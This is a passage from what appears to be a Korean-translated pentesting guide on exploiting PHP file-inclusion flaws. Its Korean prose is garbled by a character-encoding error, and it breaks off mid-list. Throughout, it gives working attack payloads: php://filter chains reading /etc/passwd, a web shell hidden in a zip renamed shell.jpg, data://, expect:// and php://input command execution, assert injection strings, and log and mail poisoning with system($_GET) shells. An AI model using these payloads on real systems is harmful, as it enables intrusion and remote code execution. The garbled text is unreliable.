* `mcrypt.*` : ì‚¬ìš© ì¤‘ë‹¨ë¨
* `mdecrypt.*` : ì‚¬ìš© ì¤‘ë‹¨ë¨
* ê¸°íƒ€ í•„í„°
* phpì—ì„œ `var_dump(stream_get_filters());`ë¥¼ ì‹¤í–‰í•˜ë©´ ëª‡ ê°€ì§€ **ì˜ˆìƒì¹˜ ëª»í•œ í•„í„°**ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
* `consumed`
* `dechunk`: HTTP ì²­í¬ ì¸ì½”ë”©ì„ ë°˜ì „ì‹œí‚µë‹ˆë‹¤
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,Â£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
"php://filter" ë¶€ë¶„ì€ ëŒ€ì†Œë¬¸ìë¥¼ êµ¬ë¶„í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.
{% endhint %}

### ì„ì˜ íŒŒì¼ì„ ì½ê¸° ìœ„í•œ ì˜¤ë¼í´ë¡œì„œ php í•„í„° ì‚¬ìš©í•˜ê¸°

[**ì´ ê²Œì‹œë¬¼**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle)ì—ì„œëŠ” ì„œë²„ë¡œë¶€í„° ë°˜í™˜ëœ ì¶œë ¥ ì—†ì´ ë¡œì»¬ íŒŒì¼ì„ ì½ëŠ” ê¸°ìˆ ì„ ì œì•ˆí•©ë‹ˆë‹¤. ì´ ê¸°ìˆ ì€ **php í•„í„°ë¥¼ ì˜¤ë¼í´ë¡œ ì‚¬ìš©í•˜ì—¬ íŒŒì¼ì„ ë¬¸ì ë‹¨ìœ„ë¡œ ë…¸ì¶œí•˜ëŠ” ë¶€ìš¸ ì¶”ì¶œ**ì— ê¸°ë°˜í•©ë‹ˆë‹¤. ì´ëŠ” php í•„í„°ê°€ í…ìŠ¤íŠ¸ë¥¼ ì¶©ë¶„íˆ í¬ê²Œ ë§Œë“¤ì–´ phpê°€ ì˜ˆì™¸ë¥¼ ë°œìƒì‹œí‚¬ ìˆ˜ ìˆë„ë¡ ì‚¬ìš©ë  ìˆ˜ ìˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.

ì›ë³¸ ê²Œì‹œë¬¼ì—ì„œ ê¸°ìˆ ì— ëŒ€í•œ ìì„¸í•œ ì„¤ëª…ì„ ì°¾ì„ ìˆ˜ ìˆì§€ë§Œ, ì—¬ê¸°ì— ê°„ë‹¨í•œ ìš”ì•½ì´ ìˆìŠµë‹ˆë‹¤:

* **`UCS-4LE`** ì½”ë±ì„ ì‚¬ìš©í•˜ì—¬ í…ìŠ¤íŠ¸ì˜ ì„ í–‰ ë¬¸ìë¥¼ ë‚¨ê²¨ë‘ê³  ë¬¸ìì—´ í¬ê¸°ë¥¼ ì§€ìˆ˜ì ìœ¼ë¡œ ì¦ê°€ì‹œí‚µë‹ˆë‹¤.
* ì´ë¥¼ ì‚¬ìš©í•˜ì—¬ **ì´ˆê¸° ë¬¸ìê°€ ì˜¬ë°”ë¥´ê²Œ ì¶”ì¸¡ë  ë•Œ í…ìŠ¤íŠ¸ê°€ ë§¤ìš° ì»¤ì§€ê²Œ** í•˜ì—¬ phpê°€ **ì˜¤ë¥˜ë¥¼ ë°œìƒ**ì‹œí‚µë‹ˆë‹¤.
* **dechunk** í•„í„°ëŠ” **ì²« ë²ˆì§¸ ë¬¸ìê°€ 16ì§„ìˆ˜ê°€ ì•„ë‹Œ ê²½ìš° ëª¨ë“  ê²ƒì„ ì œê±°**í•˜ë¯€ë¡œ ì²« ë²ˆì§¸ ë¬¸ìê°€ 16ì§„ìˆ˜ì¸ì§€ ì—¬ë¶€ë¥¼ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* ì´ëŠ” ì´ì „ ê²ƒê³¼ ê²°í•©ë˜ë©´ (ê·¸ë¦¬ê³  ì¶”ì¸¡ëœ ë¬¸ìì— ë”°ë¼ ë‹¤ë¥¸ í•„í„°ë“¤ê³¼ í•¨ê»˜), í…ìŠ¤íŠ¸ì˜ ì‹œì‘ ë¶€ë¶„ì˜ ë¬¸ìë¥¼ ì¶”ì¸¡í•  ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤. 16ì§„ìˆ˜ì´ë©´ dechunkê°€ ì‚­ì œí•˜ì§€ ì•Šê³  ì´ˆê¸° í­íƒ„ì´ php ì˜¤ë¥˜ë¥¼ ë°œìƒì‹œí‚¬ ê²ƒì…ë‹ˆë‹¤.
* ì½”ë± **convert.iconv.UNICODE.CP930**ëŠ” ê° ë¬¸ìë¥¼ ë‹¤ìŒ ë¬¸ìë¡œ ë³€í™˜í•©ë‹ˆë‹¤ (ë”°ë¼ì„œ ì´ ì½”ë±ì„ ì ìš©í•˜ë©´ a -> b). ì´ë¥¼ í†µí•´ ì˜ˆë¥¼ ë“¤ì–´ ì²« ê¸€ìê°€ `a`ì¸ì§€ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì™œëƒí•˜ë©´ ì´ ì½”ë±ì„ 6ë²ˆ ì ìš©í•˜ë©´ a->b->c->d->e->f->gë¡œ ê¸€ìê°€ ë” ì´ìƒ 16ì§„ìˆ˜ ë¬¸ìê°€ ì•„ë‹ˆê²Œ ë˜ë¯€ë¡œ dechunkê°€ ì‚­ì œí•˜ì§€ ì•Šê³  php ì˜¤ë¥˜ê°€ ë°œìƒí•©ë‹ˆë‹¤.
* **rot13**ê³¼ ê°™ì€ ë‹¤ë¥¸ ë³€í™˜ì„ ì‚¬ìš©í•˜ì—¬ ì‹œì‘ ë¶€ë¶„ì—ì„œ n, o, p, q, rê³¼ ê°™ì€ ë‹¤ë¥¸ ë¬¸ìë¥¼ ë…¸ì¶œì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ë‹¤ë¥¸ ì½”ë±ì„ ì‚¬ìš©í•˜ì—¬ ë‹¤ë¥¸ ë¬¸ìë¥¼ 16ì§„ìˆ˜ ë²”ìœ„ë¡œ ì´ë™ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤).
* ì´ˆê¸° ë¬¸ìê°€ ìˆ«ìì¸ ê²½ìš°ì—ëŠ” base64ë¡œ ì¸ì½”ë”©í•˜ê³  ìˆ«ìë¥¼ ë…¸ì¶œì‹œí‚¤ê¸° ìœ„í•´ ì²˜ìŒ 2ê°œì˜ ë¬¸ìë¥¼ ë…¸ì¶œì‹œì¼œì•¼ í•©ë‹ˆë‹¤.
* **ì´ˆê¸° ë¬¸ì ì´ìƒì„ ë…¸ì¶œí•˜ëŠ” ë°©ë²•**ì€ **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE**ì™€ ê°™ì€ ìˆœì„œ ë©”ëª¨ë¦¬ í•„í„°ë¥¼ ì‚¬ìš©í•˜ì—¬ ë¬¸ìì˜ ìˆœì„œë¥¼ ë³€ê²½í•˜ê³  í…ìŠ¤íŠ¸ì˜ ì²« ë²ˆì§¸ ìœ„ì¹˜ì— ë‹¤ë¥¸ ë¬¸ìë¥¼ ê°€ì ¸ì˜¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **ë” ë§ì€ ë°ì´í„°ë¥¼ ì–»ê¸° ìœ„í•´**ëŠ” **convert.iconv.UTF16.UTF16**ë¡œ ì‹œì‘ ë¶€ë¶„ì— 2ë°”ì´íŠ¸ì˜ ì“°ë ˆê¸° ë°ì´í„°ë¥¼ ìƒì„±í•˜ê³ , **UCS-4LE**ë¥¼ ì ìš©í•˜ì—¬ **ë‹¤ìŒ 2ë°”ì´íŠ¸ì™€ í”¼ë²—**í•˜ê³  ì“°ë ˆê¸° ë°ì´í„°ê¹Œì§€ ë°ì´í„°ë¥¼ **ì‚­ì œ**í•©ë‹ˆë‹¤ (ì´ë ‡ê²Œ í•˜ë©´ ì´ˆê¸° í…ìŠ¤íŠ¸ì˜ ì²˜ìŒ 2ë°”ì´íŠ¸ê°€ ì œê±°ë©ë‹ˆë‹¤). ì›í•˜ëŠ” ë¹„íŠ¸ë¥¼ ë…¸ì¶œí•  ë•Œê¹Œì§€ ê³„ì†í•©ë‹ˆë‹¤.

ê²Œì‹œë¬¼ì—ì„œëŠ” ì´ë¥¼ ìë™ìœ¼ë¡œ ìˆ˜í–‰í•˜ëŠ” ë„êµ¬ë„ ëˆ„ì„¤ë˜ì—ˆìŠµë‹ˆë‹¤: [php\_filters\_chain\_oracle\_exploit](https://github.com/synacktiv/php\_filter\_chains\_oracle\_exploit).

### php://fd

ì´ ë˜í¼ëŠ” í”„ë¡œì„¸ìŠ¤ê°€ ì—´ì–´ ë‘” íŒŒì¼ ë””ìŠ¤í¬ë¦½í„°ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤. ì—´ë ¤ ìˆëŠ” íŒŒì¼ì˜ ë‚´ìš©ì„ ë…¸ì¶œí•˜ëŠ” ë° ìœ ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
ë‹¹ì‹ ì€ **php://stdin, php://stdout ê·¸ë¦¬ê³  php://stderr**ë¥¼ ì‚¬ìš©í•˜ì—¬ ê°ê° **íŒŒì¼ ë””ìŠ¤í¬ë¦½í„° 0, 1 ê·¸ë¦¬ê³  2**ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ì–´ë–»ê²Œ ê³µê²©ì— ìœ ìš©í• ì§€ëŠ” í™•ì‹¤í•˜ì§€ ì•ŠìŒ)

### zip:// ê·¸ë¦¬ê³  rar://

PHPShellì´ í¬í•¨ëœ Zip ë˜ëŠ” Rar íŒŒì¼ì„ ì—…ë¡œë“œí•˜ê³  ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
rar í”„ë¡œí† ì½œì„ ë‚¨ìš©í•˜ê¸° ìœ„í•´ì„œëŠ” **íŠ¹ë³„íˆ í™œì„±í™”**ë˜ì–´ì•¼ í•©ë‹ˆë‹¤.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://

### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
ì´ í”„ë¡œí† ì½œì€ php êµ¬ì„±ì— ì˜í•´ ì œí•œë©ë‹ˆë‹¤ **`allow_url_open`** ë° **`allow_url_include`**

### expect://

Expectê°€ í™œì„±í™”ë˜ì–´ ìˆì–´ì•¼ í•©ë‹ˆë‹¤. ì´ë¥¼ ì‚¬ìš©í•˜ì—¬ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### ì…ë ¥://

POST ë§¤ê°œë³€ìˆ˜ì— í˜ì´ë¡œë“œë¥¼ ì§€ì •í•˜ì‹­ì‹œì˜¤:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ íŒŒì¼ ë¡œë”©ì„ ìœ„í•´ `include`ì™€ ê°™ì€ í•¨ìˆ˜ë¥¼ í™œìš©í•  ë•Œ `.phar` íŒŒì¼ì„ ì‚¬ìš©í•˜ì—¬ PHP ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì•„ë˜ ì œê³µëœ PHP ì½”ë“œ ìŠ¤ë‹ˆí«ì€ `.phar` íŒŒì¼ì„ ìƒì„±í•˜ëŠ” ë°©ë²•ì„ ë³´ì—¬ì¤ë‹ˆë‹¤:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
`.phar` íŒŒì¼ì„ ì»´íŒŒì¼í•˜ë ¤ë©´ ë‹¤ìŒ ëª…ë ¹ì„ ì‹¤í–‰í•´ì•¼ í•©ë‹ˆë‹¤:
```bash
php --define phar.readonly=0 create_path.php
```
ì‹¤í–‰í•˜ë©´ `test.phar`ë¼ëŠ” íŒŒì¼ì´ ìƒì„±ë˜ë©°, ì´ëŠ” ë¡œì»¬ íŒŒì¼ í¬í•¨ (LFI) ì·¨ì•½ì ì„ ì•…ìš©í•  ìˆ˜ ìˆëŠ” ê°€ëŠ¥ì„±ì´ ìˆìŠµë‹ˆë‹¤.

LFIê°€ PHP ì½”ë“œë¥¼ ì‹¤í–‰í•˜ì§€ ì•Šê³  íŒŒì¼ì„ ì½ê¸°ë§Œ í•˜ëŠ” ê²½ìš°, `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, ë˜ëŠ” `filesize()`ì™€ ê°™ì€ í•¨ìˆ˜ë¥¼ í†µí•´ ì§ë ¬í™” ì·¨ì•½ì ì„ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì·¨ì•½ì ì€ `phar` í”„ë¡œí† ì½œì„ ì‚¬ìš©í•˜ì—¬ íŒŒì¼ì„ ì½ëŠ” ê²ƒê³¼ ê´€ë ¨ì´ ìˆìŠµë‹ˆë‹¤.

`.phar` íŒŒì¼ì˜ ì§ë ¬í™” ì·¨ì•½ì ì„ ì•…ìš©í•˜ëŠ” ë°©ë²•ì— ëŒ€í•œ ìì„¸í•œ ë‚´ìš©ì€ ì•„ë˜ ë§í¬ëœ ë¬¸ì„œë¥¼ ì°¸ì¡°í•˜ì‹­ì‹œì˜¤:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### ë” ë§ì€ í”„ë¡œí† ì½œ

ë” ë§ì€ ê°€ëŠ¥í•œ[ **ì—¬ê¸°ì— í¬í•¨í•  í”„ë¡œí† ì½œ**](https://www.php.net/manual/en/wrappers.php)**ì„ í™•ì¸í•˜ì‹­ì‹œì˜¤**:

* [php://memory ë° php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) â€” ë©”ëª¨ë¦¬ë‚˜ ì„ì‹œ íŒŒì¼ì— ì“°ê¸° (íŒŒì¼ í¬í•¨ ê³µê²©ì— ì–´ë–»ê²Œ ìœ ìš©í• ì§€ëŠ” í™•ì‹¤í•˜ì§€ ì•ŠìŒ)
* [file://](https://www.php.net/manual/en/wrappers.file.php) â€” ë¡œì»¬ íŒŒì¼ ì‹œìŠ¤í…œ ì ‘ê·¼
* [http://](https://www.php.net/manual/en/wrappers.http.php) â€” HTTP(s) URL ì ‘ê·¼
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) â€” FTP(s) URL ì ‘ê·¼
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) â€” ì••ì¶• ìŠ¤íŠ¸ë¦¼
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) â€” íŒ¨í„´ê³¼ ì¼ì¹˜í•˜ëŠ” ê²½ë¡œëª… ì°¾ê¸° (ì¶œë ¥ ê°€ëŠ¥í•œ ê²ƒì„ ë°˜í™˜í•˜ì§€ ì•Šìœ¼ë¯€ë¡œ ì—¬ê¸°ì„œëŠ” ì‹¤ì œë¡œ ìœ ìš©í•˜ì§€ ì•ŠìŒ)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) â€” ë³´ì•ˆ ì‰˜ 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) â€” ì˜¤ë””ì˜¤ ìŠ¤íŠ¸ë¦¼ (ì„ì˜ íŒŒì¼ì„ ì½ëŠ” ë° ìœ ìš©í•˜ì§€ ì•ŠìŒ)

## PHPì˜ 'assert'ë¥¼ í†µí•œ LFI

PHPì—ì„œ 'assert' í•¨ìˆ˜ë¥¼ ë‹¤ë£° ë•Œ ë¡œì»¬ íŒŒì¼ í¬í•¨ (LFI) ìœ„í—˜ì€ íŠ¹íˆ ë†’ìŠµë‹ˆë‹¤. 'assert' í•¨ìˆ˜ëŠ” ë¬¸ìì—´ ë‚´ì—ì„œ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì—, ë””ë ‰í„°ë¦¬ ì´ë™ ë¬¸ìì¸ ".."ê³¼ ê°™ì€ ì…ë ¥ì´ ì ì ˆí•˜ê²Œ ê²€ì‚¬ë˜ì§€ ì•Šì€ ê²½ìš° ë¬¸ì œê°€ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´, PHP ì½”ë“œê°€ ë””ë ‰í„°ë¦¬ ì´ë™ì„ ë°©ì§€í•˜ë„ë¡ ì„¤ê³„ë˜ì—ˆì§€ë§Œ ë‹¤ìŒê³¼ ê°™ì´ ì²˜ë¦¬ë˜ì§€ ì•Šì€ ê²½ìš°:
```bash
assert("strpos('$file', '..') === false") or die("");
```
ì´ëŠ” íƒìƒ‰ì„ ë§‰ê¸° ìœ„í•´ ë§Œë“¤ì–´ì¡Œì§€ë§Œ, ì½”ë“œ ì‚½ì…ì„ ìœ„í•œ ë²¡í„°ë¥¼ ì‹¤ìˆ˜ë¡œ ë§Œë“¤ì–´ëƒ…ë‹ˆë‹¤. íŒŒì¼ ë‚´ìš©ì„ ì½ê¸° ìœ„í•´ ì´ë¥¼ ì•…ìš©í•˜ë ¤ëŠ” ê³µê²©ìëŠ” ë‹¤ìŒì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
ë§ˆì°¬ê°€ì§€ë¡œ, ì„ì˜ ì‹œìŠ¤í…œ ëª…ë ¹ì„ ì‹¤í–‰í•˜ê¸° ìœ„í•´ ë‹¤ìŒì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```plaintext
' and die(system("id")) or '
```
**Payloadsë¥¼ URL ì¸ì½”ë”©í•˜ëŠ” ê²ƒì´ ì¤‘ìš”í•©ë‹ˆë‹¤**.

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) ì„œë²„ì— ê°€ì…í•˜ì—¬ ê²½í—˜ ë§ì€ í•´ì»¤ ë° ë²„ê·¸ ë°”ìš´í‹° í—Œí„°ë“¤ê³¼ ì†Œí†µí•˜ì„¸ìš”!

**í•´í‚¹ í†µì°°**\
í•´í‚¹ì˜ ìŠ¤ë¦´ê³¼ ë„ì „ì— ëŒ€í•´ íƒêµ¬í•˜ëŠ” ì½˜í…ì¸ ì™€ ìƒí˜¸ ì‘ìš©í•˜ì„¸ìš”

**ì‹¤ì‹œê°„ í•´í‚¹ ë‰´ìŠ¤**\
ì‹¤ì‹œê°„ ë‰´ìŠ¤ì™€ í†µì°°ì„ í†µí•´ ë¹ ë¥´ê²Œ ë³€í™”í•˜ëŠ” í•´í‚¹ ì„¸ê³„ë¥¼ íŒŒì•…í•˜ì„¸ìš”

**ìµœì‹  ê³µì§€**\
ìµœì‹  ë²„ê·¸ ë°”ìš´í‹° ì¶œì‹œ ë° ì¤‘ìš”í•œ í”Œë«í¼ ì—…ë°ì´íŠ¸ì— ëŒ€í•´ ì•Œì•„ë‘ì„¸ìš”

**[Discord](https://discord.com/invite/N3FrSbmwdy)**ì— ì°¸ì—¬í•˜ì—¬ ìµœê³ ì˜ í•´ì»¤ë“¤ê³¼ í˜‘ì—…ì„ ì‹œì‘í•˜ì„¸ìš”!

## PHP Blind Path Traversal

{% hint style="warning" %}
ì´ ê¸°ìˆ ì€ **íŒŒì¼ ê²½ë¡œ**ë¥¼ **ì œì–´**í•  ìˆ˜ ìˆì§€ë§Œ íŒŒì¼ ë‚´ìš©ì„ ë³¼ ìˆ˜ ì—†ëŠ” ê²½ìš°ì— ê´€ë ¨ì´ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ **`file()`**ë¥¼ í˜¸ì¶œí•˜ëŠ” **PHP í•¨ìˆ˜**ì—ì„œ íŒŒì¼ì— ì•¡ì„¸ìŠ¤í•  ê²ƒì´ì§€ë§Œ ë‚´ìš©ì´ í‘œì‹œë˜ì§€ ì•ŠëŠ” ê²½ìš°ì— ìœ ìš©í•©ë‹ˆë‹¤.
{% endhint %}

[**ì´ ë†€ë¼ìš´ ê²Œì‹œë¬¼**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html)ì—ì„œ PHP í•„í„°ë¥¼ í†µí•´ ë¸”ë¼ì¸ë“œ ê²½ë¡œ ìˆœíšŒë¥¼ ì•…ìš©í•˜ì—¬ íŒŒì¼ ë‚´ìš©ì„ **ì—ëŸ¬ ì˜¤ë¼í´ì„ í†µí•´ ìœ ì¶œí•˜ëŠ” ë°©ë²•**ì— ëŒ€í•´ ì„¤ëª…ë˜ì–´ ìˆìŠµë‹ˆë‹¤.

ê¸°ë³¸ì ìœ¼ë¡œ ì´ ê¸°ìˆ ì€ íŒŒì¼ì˜ ë‚´ìš©ì„ **ë§¤ìš° í¬ê²Œ ë§Œë“¤ê¸° ìœ„í•´ "UCS-4LE" ì¸ì½”ë”©**ì„ ì‚¬ìš©í•˜ì—¬ íŒŒì¼ì„ ì—´ ë•Œ **ì—ëŸ¬**ë¥¼ ìœ ë°œì‹œí‚¤ëŠ” ê²ƒì…ë‹ˆë‹¤.

ê·¸ëŸ° ë‹¤ìŒ, ì²« ë²ˆì§¸ ë¬¸ìë¥¼ ë…¸ì¶œì‹œí‚¤ê¸° ìœ„í•´ **`dechunk`** í•„í„°ë¥¼ ì‚¬ìš©í•˜ê³  **base64** ë˜ëŠ” **rot13**ì™€ ê°™ì€ ë‹¤ë¥¸ í•„í„°ì™€ í•¨ê»˜ ì‚¬ìš©í•˜ë©° ë§ˆì§€ë§‰ìœ¼ë¡œ **convert.iconv.UCS-4.UCS-4LE** ë° **convert.iconv.UTF16.UTF-16BE** í•„í„°ë¥¼ ì‚¬ìš©í•˜ì—¬ ë‹¤ë¥¸ ë¬¸ìë¥¼ **ì²« ë²ˆì§¸ì— ë°°ì¹˜í•˜ê³  ë…¸ì¶œì‹œí‚µë‹ˆë‹¤**.

**ì·¨ì•½í•  ìˆ˜ ìˆëŠ” í•¨ìˆ˜**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (ì´ í•¨ìˆ˜ë¡œë§Œ ì½ê¸° ì „ìš© ëŒ€ìƒ)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

ê¸°ìˆ ì ì¸ ì„¸ë¶€ ì •ë³´ëŠ” ì–¸ê¸‰ëœ ê²Œì‹œë¬¼ì„ í™•ì¸í•˜ì„¸ìš”!

## LFI2RCE

### ì›ê²© íŒŒì¼ í¬í•¨

ì´ì „ì— ì„¤ëª…í•œ ë‚´ìš©ì€ [**ì´ ë§í¬ë¥¼ ë”°ë¥´ì„¸ìš”**](./#remote-file-inclusion).

### Apache/Nginx ë¡œê·¸ íŒŒì¼ì„ í†µí•œ ë°©ë²•

Apache ë˜ëŠ” Nginx ì„œë²„ê°€ **LFIì— ì·¨ì•½**í•œ ê²½ìš°, include í•¨ìˆ˜ ë‚´ì—ì„œ **`/var/log/apache2/access.log` ë˜ëŠ” `/var/log/nginx/access.log`**ì— ì•¡ì„¸ìŠ¤ë¥¼ ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **ì‚¬ìš©ì ì—ì´ì „íŠ¸** ë˜ëŠ” **GET ë§¤ê°œë³€ìˆ˜** ë‚´ì— **`<?php system($_GET['c']); ?>`**ì™€ ê°™ì€ PHP ì…¸ì„ ì„¤ì •í•˜ê³  í•´ë‹¹ íŒŒì¼ì„ í¬í•¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% hint style="warning" %}
ì…¸ì— **ë‹¨ì¼ ë”°ì˜´í‘œ ëŒ€ì‹  ì´ì¤‘ ë”°ì˜´í‘œë¥¼ ì‚¬ìš©**í•˜ëŠ” ê²½ìš°, ì´ì¤‘ ë”°ì˜´í‘œëŠ” "_**quote;**_"ë¡œ ìˆ˜ì •ë˜ë©°, **PHPì—ì„œ ì˜¤ë¥˜ê°€ ë°œìƒ**í•˜ê³  **ë‹¤ë¥¸ ì‘ì—…ì´ ì‹¤í–‰ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤**.

ë˜í•œ í˜ì´ë¡œë“œë¥¼ **ì˜¬ë°”ë¥´ê²Œ ì‘ì„±**í•´ì•¼ í•˜ë©°, PHPê°€ ë¡œê·¸ íŒŒì¼ì„ ë¡œë“œí•  ë•Œë§ˆë‹¤ ì˜¤ë¥˜ê°€ ë°œìƒí•˜ê³  ë‘ ë²ˆì§¸ ê¸°íšŒê°€ ì—†ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

ì´ê²ƒì€ ë‹¤ë¥¸ ë¡œê·¸ì—ì„œë„ ìˆ˜í–‰í•  ìˆ˜ ìˆì§€ë§Œ, ë¡œê·¸ ë‚´ë¶€ì˜ ì½”ë“œê°€ URL ì¸ì½”ë”©ë˜ì–´ ìˆì„ ìˆ˜ ìˆìœ¼ë©° ì´ë¡œ ì¸í•´ ì…¸ì´ ì†ìƒë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **"basic" ì¸ì¦ í—¤ë”**ì—ëŠ” Base64ë¡œ "user:password"ê°€ í¬í•¨ë˜ì–´ ìˆìœ¼ë©° ë¡œê·¸ ë‚´ì—ì„œ ë””ì½”ë”©ë©ë‹ˆë‹¤. PHPShellì„ ì´ í—¤ë” ë‚´ì— ì‚½ì…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ë‹¤ë¥¸ ê°€ëŠ¥í•œ ë¡œê·¸ ê²½ë¡œ:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
### ì´ë©”ì¼ì„ í†µí•´

ë‚´ë¶€ ê³„ì • (user@localhost)ìœ¼ë¡œ PHP í˜ì´ë¡œë“œì¸ `<?php echo system($_REQUEST["cmd"]); ?>`ë¥¼ í¬í•¨í•˜ëŠ” ì´ë©”ì¼ì„ ë³´ë‚´ê³  **`/var/mail/<USERNAME>`** ë˜ëŠ” **`/var/spool/mail/<USERNAME>`**ê³¼ ê°™ì€ ê²½ë¡œë¡œ ì‚¬ìš©ìì˜ ë©”ì¼ì„ í¬í•¨í•´ë³´ì„¸ìš”.

### /proc/\*/fd/\*ë¥¼ í†µí•´

1. ë§ì€ ì‰˜ì„ ì—…ë¡œë“œí•©ë‹ˆë‹¤ (ì˜ˆ : 100)
